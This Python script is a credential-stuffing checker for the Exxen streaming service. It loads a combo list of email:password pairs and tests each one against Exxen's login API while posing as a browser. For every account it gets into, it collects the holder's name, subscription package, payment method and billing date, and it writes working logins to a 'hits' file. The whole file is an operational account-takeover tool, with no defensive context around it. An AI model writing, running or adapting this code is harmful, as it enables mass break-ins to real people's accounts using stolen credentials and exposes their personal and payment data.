import requests
import base64
import os
from datetime import datetime
from colorama import init, Fore, Style

init()

class ExxenChecker:
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
            'Accept': 'application/json',
            'Origin': 'https://www.exxen.com',
            'Referer': 'https://www.exxen.com/'
        })

    def check_account(self, email, password):
        try:
            auth = base64.b64encode(f"{email}:{password}".encode()).decode()
            login_url = "https://mw-proxy.app.exxen.com/user/login"
            login_data = {
                "deviceDetails": {
                    "deviceName": "Chrome", "deviceType": "Desktop",
                    "modelNo": "131.0.0.0", "serialNo": "131.0.0.0",
                    "brand": "Chrome", "os": "Windows", "osVersion": "10"
                }
            }
            headers = {'Authorization': f'Basic {auth}', 'Content-Type': 'application/json'}
            response = self.session.post(login_url, json=login_data, headers=headers)
            
            if response.status_code != 200:
                return {'ok': False, 'msg': 'Invalid credentials or network error'}
            
            data = response.json()
            token = data.get('bearer', {}).get('auth', {}).get('token')
            if not token:
                return {'ok': False, 'msg': 'Token not found'}

            sub_url = "https://mw-proxy.app.exxen.com/user/getActiveSubscriptions"
            sub_headers = {'Authorization': f'Bearer {token}', 'Content-Type': 'application/json'}
            sub_response = self.session.post(sub_url, json={"returnLocaleDisplayName": "T"}, headers=sub_headers)
            sub_data = sub_response.json()

            result = {
                'ok': True,
                'msg': 'Login successful',
                'membership': {
                    'status': 'Premium' if any(i.get('status') == 'Active' for i in sub_data.get('items', [])) else 'Free',
                    'country': sub_data.get('country', 'Unknown'),
                    'package': next((i.get('displayName') for i in sub_data.get('items', [])), 'No active package'),
                    'payment': sub_data.get('paymentMethod', 'Unknown'),
                    'name': data.get('name', 'Unknown'),
                    'email': data.get('email', 'Unknown'),
                    'type': data.get('accountType', 'Unknown')
                }
            }
            next_billing = sub_data.get('nextBillingDateTime')
            if next_billing:
                result['membership']['billing_date'] = datetime.fromtimestamp(int(next_billing)).strftime('%d.%m.%Y')
                result['membership']['amount'] = sub_data.get('nextBillingAmount', 'None')
            return result
        except Exception as e:
            return {'ok': False, 'msg': f'Error: {str(e)}'}

def main():
    path = input("Combo file path: ").strip()
    if not os.path.isfile(path):
        print(Fore.RED + "File not found!" + Style.RESET_ALL)
        return
    
    with open(path, 'r', encoding='utf-8') as f:
        combos = [line.strip() for line in f if ':' in line]
    
    print(Fore.CYAN + f"Found {len(combos)} combos. Checking..." + Style.RESET_ALL)
    checker = ExxenChecker()
    
    for i, combo in enumerate(combos, 1):
        email, password = combo.split(':', 1)
        print(Fore.YELLOW + f"[{i}/{len(combos)}] Checking {email}..." + Style.RESET_ALL)
        result = checker.check_account(email, password)
        
        if result['ok']:
            print(Fore.GREEN + f"Success: {combo}" + Style.RESET_ALL)
            print(Fore.GREEN + f"Name: {result['membership']['name']} | Type: {result['membership']['type']} | Status: {result['membership']['status']}" + Style.RESET_ALL)
            if result['membership']['status'] == 'Premium':
                print(Fore.YELLOW + f"Package: {result['membership']['package']} | Amount: {result['membership'].get('amount', 'None')} | Date: {result['membership'].get('billing_date', '-')}" + Style.RESET_ALL)
            with open("exxenhits.txt", "a", encoding='utf-8') as f:
                f.write(combo + "\n")
        else:
            print(Fore.RED + f"Failed: {combo} | {result['msg']}" + Style.RESET_ALL)
            with open("fails.txt", "a", encoding='utf-8') as f:
                f.write(f"{combo} | {result['msg']}\n")

if __name__ == "__main__":
    main()                
